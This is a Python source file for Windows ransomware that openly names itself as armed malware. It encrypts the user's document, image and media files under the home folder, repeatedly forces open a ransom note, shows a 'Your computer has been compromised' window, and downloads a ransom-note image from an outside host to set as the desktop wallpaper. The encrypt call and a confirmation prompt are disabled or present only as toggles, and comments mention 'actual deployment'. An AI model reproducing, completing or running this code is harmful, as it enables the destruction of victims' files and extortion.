# This will encrypt all the files on the host system

import os
from cryptography.fernet import Fernet
import threading
import subprocess
import time
import win32gui
from tkinter import *
from playsound import playsound
import ctypes
import urllib.request
####################################################################################################
#
#
#               THIS IS ARMED BE CAREFUL
#
#
####################################################################################################
class RansomWare:

    def __init__(self):
        self.key = None # used for the Fernet Key
        self.crypter = None # Encrypter/Decrypter
        self.public_key = None # used for RSA public key
        self.encrypted = False
        
        # saftey
        self.run = False

        # Files to attack
        # 'doc', 'xls', 'jpg', 'zip', 'pdf',
        # NO EXE will brick system 
        # unless you wanna do that 
        self.enc_extensions = ('doc', 'xls', 'jpg', 'zip', 'pdf','aiff','aif','au','avi','bat','bmp','class','java','csv','cvs','dbf',
        'dif','doc','docx','eps','fm3','gif','hqx','htm','html','jpg','jpeg','mac','map','mdb','mid','midi','mp3','mp4','mov','qt','mtb','mtw',
        'pdf','p65','t65','png','ppt','pptx','psd','psp','qxd','ra','rtf','sit','tar','tif','txt','wav','wk3','wks','wpd','wp5','xls','xlsx','zip')
        
        # use to annihilate host machine 

        self.file_paths = [] # array of all file paths to encrypt
        for root, dirs, files in os.walk('C:\\'):
            for file in files:
                file_path, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in self.enc_extensions:
                    self.file_paths.append(root+'\\'+file)
        
        # use for testing
        #self.localRoot = r'F:\localRoot'
        # use in place of local root
        self.sysRoot = os.path.expanduser('~')


    # make fernet keys
    def generate_key(self):
        self.key = Fernet.generate_key() # creates the Key
        self.crypter = Fernet(self.key) # creates a Fernet obj with prebuilt methods

    # export Fernet keys
    def write_key(self):
        with open('Fernet_key.txt', 'wb') as f:
            f.write(self.key)

    def encrypt_file(self, filepath):
        with open(filepath, 'rb') as f:
            data = f.read()
            enc_data = self.crypter.encrypt(data)
        with open(filepath, 'wb') as fp:
            fp.write(enc_data)

    def decrypt_file(self, filepath):
        with open(filepath, 'rb') as f:
            data = f.read()
            enc_data = self.crypter.decrypt(data)
        with open(filepath, 'wb') as fp:
            fp.write(enc_data)

    def decrypt_system(self):
        system = os.walk(self.sysRoot)
        for root, dir, files in system:
            for file in files:
                filepath = os.path.join(root,file)
                if not file.split('.')[-1] in self.enc_extensions: 
                    continue # only encrypt files with the specified extensions
                if self.encrypted:
                    try:
                        self.decrypt_file(filepath)
                    except:
                        pass

        self.encrypted = False

    def encrypt_system(self):
        system = os.walk(self.sysRoot)
        for root, dir, files in system:
            for file in files:
                filepath = os.path.join(root,file)
                if not file.split('.')[-1] in self.enc_extensions: 
                    continue # only encrypt files with the specified extensions
                if not self.encrypted:
                    try:
                        self.encrypt_file(filepath)
                    except:
                        pass
        self.encrypted = True

    def write_note(Self):
        with open('ransom.txt', 'w') as f:
            f.write('''Im in your network''')

    def show_note(self):
        ransom_note = subprocess.Popen(['notepad.exe', 'ransom.txt'])
        count = 0 # count of how many times the note has came back
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'ransom - Notepad':
                pass
            else:
                time.sleep(0.1)
                ransom_note.kill() # kill to ensure we can open a new instance
                time.sleep(0.1)
                ransom_note = subprocess.Popen(['notepad.exe', 'ransom.txt'])
            time.sleep(10) # time to wait to re-eval if note is still open
            count +=1 
            if count == 1: # make a while true for victims machine
                break


    def show_gui(self):     
        window = Tk()
        window.title("Your computer has been compromised")
        window.geometry('600x300')
        lbl = Label(window, text="Click here to decrypt: ")

        lbl.grid(column=0, row=0)
        def clicked():

            lbl.configure(text="Decrypting Files...")
            self.decrypt_system()
            window.destroy()

        btn = Button(window, text="Click Me", command=clicked)
        btn.grid(column=1, row=0)

        # puts the gui to the top of your screen
        window.lift()
        window.attributes('-topmost',True)
        window.after_idle(window.attributes,'-topmost',False)

        # fun idea but breaks too easy
        # malware can't be unstable
        # playsound('mail.mp3')
        window.mainloop()

    def show_warning(self):
        window = Tk()
        window.title("Are you sure you wish to run this? ")
        window.geometry('600x300')
        lbl = Label(window, text="Click here to run malware: ")

        lbl.grid(column=0, row=0)
        def clicked():
            self.run = True
            window.destroy()

        btn = Button(window, text="Run Malware", command=clicked)
        btn.grid(column=1, row=0)

        # puts the gui to the top of your screen
        window.lift()
        window.attributes('-topmost',True)
        window.after_idle(window.attributes,'-topmost',False)

        window.mainloop()

    def set_background(self):
        # caused mass error on target machine
        try:
            imageUrl = 'https://download1346.mediafire.com/4e83cwa7g36g/ewwvozu7a19ynme/encrpd-ransomware-encryption-ransom-note-sensorstechforum-com.jpg'
            path = f'{self.sysRoot}\Desktop/background.jpg'
            urllib.request.urlretrieve(imageUrl, path)
            SPI_SETDESKWALLPAPER = 20
            # dlls for changing wallpaper
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
        except:
            pass


            
def main(): 
    victim = RansomWare()

    # Ensure you want to run the program.
    # remove for actual deployment
    victim.show_warning()
    if victim.run == False:
        quit()
    
    victim.generate_key()
    victim.write_key()

    # victim.encrypt_system()
    victim.set_background()
    
    victim.write_note()
    thread_1 = threading.Thread(target=victim.show_note)
    thread_1.start()
    time.sleep(1)
    victim.show_gui()
    
if __name__ == '__main__':
    main()